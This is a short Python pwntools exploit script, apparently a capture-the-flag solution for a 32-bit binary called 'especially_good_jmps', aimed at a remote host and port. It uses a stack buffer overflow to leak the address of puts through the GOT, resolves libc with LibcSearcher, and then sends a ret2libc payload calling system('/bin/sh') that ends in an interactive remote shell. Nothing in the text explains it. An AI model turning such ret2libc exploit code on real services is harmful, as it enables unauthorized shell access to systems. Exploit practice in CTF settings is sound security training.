from pwn import *
from LibcSearcher import *
context(log_level = "Debug", os = "linux", arch = "i386")
io = process("./especially_good_jmps")
e = ELF("./especially_good_jmps")
io = remote("114.55.66.54", 10001)
# gdb.attach(io)

payload = "A" * 0x2c
payload += p32(e.sym['puts'])
payload += p32(e.sym['_start'])
payload += p32(e.got['puts'])

io.sendline(payload)
io.send('1\x00')
io.recvuntil("number!")
io.recvline()
puts_addr = u32(io.recv()[:4].ljust(4, '\x00'))
print hex(puts_addr)

libc = LibcSearcher('puts', puts_addr)
system_addr = libc.dump('system')
binsh_addr = libc.dump("str_bin_sh")
system_addr = puts_addr - libc.dump('puts') + system_addr
binsh_addr = puts_addr - libc.dump('puts') + binsh_addr
print(hex(system_addr))

payload1 = "A" * 0x2b
payload1 += p32(system_addr)
payload1 += p32(0)
payload1 += p32(binsh_addr)
# io.recvuntil("name")
io.sendline(payload1)
io.sendline("2")
io.interactive()

